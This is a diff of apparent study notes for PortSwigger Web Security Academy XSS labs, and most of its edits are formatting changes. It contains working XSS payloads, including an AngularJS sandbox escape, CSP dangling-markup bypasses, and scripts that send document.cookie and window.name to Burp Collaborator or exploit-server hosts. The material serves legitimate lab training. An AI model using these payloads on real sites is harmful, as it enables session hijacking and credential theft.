@@ -2494,12 +2494,12 @@ Content-Type: application/json
    - iterate and find a working tag html element <§§> : <svg>, <animatetransform>, <title>, and <image>
    - iterate and find a working attribute <svg><animatetransform%20§§=1> : onbegin
    - Input `><svg><animatetransform onbegin=alert(1)>`   
-     https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
-
+     https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E    
+ 
 **XSS in HTML tag attributes**  
-7. Reflected XSS into **attribute with angle brackets** HTML-encoded  
-   - Test `he123"` <input type="text" placeholder="Search the blog..." name="search" `value="he123" "=""`>  
-   - `"onmouseover="alert(1)` >	`<input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert(1)">`  
+7. Reflected XSS into **attribute with angle brackets** HTML-encoded 
+ - Test `he123"` <input type="text" placeholder="Search the blog..." name="search" `value="he123" "=""`>  
+ - `"onmouseover="alert(1)` >	`<input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert(1)">`  
 8. Stored XSS into anchor **href attribute with double quotes** HTML-encoded  
    - <a id="author" `href="www.attacker1.com"`>attacker</a>
    - in website field, input `javascript:alert(1)` > `<a id="author" href="javascript:alert(1)">yuyu</a>`
@@ -2513,20 +2513,20 @@ Content-Type: application/json
 
 **XSS into JavaScript**  
 10. Reflected XSS into a JavaScript string with **single quote and backslash escaped**  
-    - **Terminating the existing script** `</script><img src=1 onerror=alert(document.domain)>`     
-      ```
-      <script>
-	...
-	var input = 'controllable data here';
-	...
-      </script>
-      ```  
-    - Test bad input  
-      ```
-      single' backslash\' >  var searchTerms = 'single\' backslash\\\'';
-       ```
-    - break out of the script block and inject a new script  
-      `</script><script>alert(1)</script>`  
+ - **Terminating the existing script** `</script><img src=1 onerror=alert(document.domain)>`     
+   ```
+   <script>
+   ...
+   var input = 'controllable data here';
+   ...
+   </script>
+   ```  
+ - Test bad input  
+   ```
+   single' backslash\' >  var searchTerms = 'single\' backslash\\\'';
+   ```
+ - break out of the script block and inject a new script  
+   `</script><script>alert(1)</script>`  
 11. Reflected XSS into a JavaScript string with **angle brackets HTML encoded**  
     - Test bad input
       ```
@@ -2558,7 +2558,7 @@ Content-Type: application/json
     - Ending the Payload: `{x:%27`    
 14. **Stored XSS into onclick event** with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped.    
     - Normal payload in href `<a id="author" href="https://www.attacker.com" onclick="var tracker={track(){}};tracker.track('https://www.attacker.com');">yuyu</a>`  
-    - Test single quote `http://evil.com' +alert() + '` > `<a id="author" href="http://evil.com\' +alert() + \'" onclick="var tracker={track(){}};tracker.track('http://evil.com\' +alert() + \'');">yuyu</a>`  
+    - Test single quote `http://evil.com' +alert() + '` > `<a id="author" href="http://evil.com\' +alert() + \'" onclick="var tracker={track(){}};tracker.track('http://evil.com\' +alert() + \'');">yuyu</a>`    
     - Use html entities `http://foo?&apos;-alert(1)-&apos;` > `<a id="author" href="http://foo?'-alert(1)-'"`    
 15. Reflected XSS into a **template literal** with angle brackets, single, double quotes, backslash and backticks Unicode-escaped  
     - template literal in js var message = `0 search results for 'hello'`;  
@@ -2566,11 +2566,11 @@ Content-Type: application/json
 
 **Client-side template injection**  
 16. Reflected XSS with **AngularJS** sandbox escape without strings (expert)  
-    - The exploit uses toString() to create a string without using quotes. It then gets the String prototype and overwrites the charAt function for every string. This effectively breaks the AngularJS sandbox.
-    - An array is passed to the orderBy filter. We then set the argument for the filter by again using toString() to create a string and the String constructor property  
-    - we use the fromCharCode method generate our payload by converting character codes into the string x=alert(1). Because the charAt function has been overwritten, AngularJS will allow this code where normally it would not
-    - visit the url `https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`
-      ```
+  - The exploit uses toString() to create a string without using quotes. It then gets the String prototype and overwrites the charAt function for every string. This effectively breaks the AngularJS sandbox.
+  - An array is passed to the orderBy filter. We then set the argument for the filter by again using toString() to create a string and the String constructor property  
+  - we use the fromCharCode method generate our payload by converting character codes into the string x=alert(1). Because the charAt function has been overwritten, AngularJS will allow this code where normally it would not
+  - visit the url `https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`
+    ```
       $scope.query = {};
       var key = 'search';
       $scope.query[key] = '1';
@@ -2579,7 +2579,7 @@ Content-Type: application/json
       $scope.query[key] = '1';
       $scope.value = $parse(key)($scope.query);
       });
-      ```  
+    ```  
 17. Reflected XSS with AngularJS sandbox escape and CSP (expoert)  
     - The exploit uses the ng-focus event in AngularJS to create a focus event that bypasses CSP. It also uses $event, which is an AngularJS variable that references the event object
     - The path property is specific to Chrome and contains an array of elements that triggered the event. The last element in the array contains the window object.
@@ -2593,9 +2593,9 @@ Content-Type: application/json
       ```
 **Exploiting XSS vulnerabilities**  
 18. Exploiting cross-site scripting to **steal cookies**  
-    - limitation: user not logged in, HttpOnly flag, block user IP, session time out	
-    - Post comment and capture the session value in Burp Collaborator
-      ```
+   - limitation: user not logged in, HttpOnly flag, block user IP, session time out	
+   - Post comment and capture the session value in Burp Collaborator
+     ```
       <script>
 	fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
 	method: 'POST',
@@ -2603,7 +2603,7 @@ Content-Type: application/json
 	body:document.cookie
 	});
       </script>
-      ```
+     ```
 19. Exploiting cross-site scripting to **capture passwords**  
     - Target password manager that performs **password auto-fill**	
     - Post comment and capture the password value in Burp Collaborator
@@ -2638,31 +2638,31 @@ Content-Type: application/json
       ```
 **Content security policy (CSP)**
 20. Reflected XSS protected by very **strict CSP**, with **dangling markup attack**
-    - Burp steps not working: follow `https://skullhat.github.io/posts/reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack/`  
-    - Email param is vulnerable to XSS  
-      ```
-      POST /my-account/change-email
+   - Burp steps not working: follow `https://skullhat.github.io/posts/reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack/`  
+   - Email param is vulnerable to XSS  
+     ```
+     POST /my-account/change-email
     
-      email=wiener2@normal-user.net&csrf=64TfvyvxkIXaSwO9JAPMDpEHBPMaqll4
-      ```
-    - Exploit server  
-      ```
-      Burp
-      <script>
+     email=wiener2@normal-user.net&csrf=64TfvyvxkIXaSwO9JAPMDpEHBPMaqll4
+     ```
+   - Exploit server  
+     ```
+     Burp
+     <script>
 	if(window.name) {
 			new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
 			} else {
 	     			location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
 	}
-      </script>
+     </script>
 
-      Solution
-      <script>
+     Solution
+     <script>
 	location='https://YOUR-LAB-ID.web-security-academy.net/my-account?email="></form><form class="login_form" name="myform" action="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" method="GET"><button class="button" type="submit">Click</button';
-      </script>
-      ```
-    - Access log, copy the CSRF token
-    - Generate CSRF PoC and replace the CSRF token
+     </script>
+     ```
+   - Access log, copy the CSRF token
+   - Generate CSRF PoC and replace the CSRF token
 21. Reflected XSS protected by CSP, with **CSP bypass**
     - The injection uses the `script-src-elem` directive in CSP. This directive allows you to target just script elements. Using this directive, you can overwrite existing script-src rules enabling you to inject `unsafe-inline`, which allows you to use inline scripts.   - Observe the response
       ```
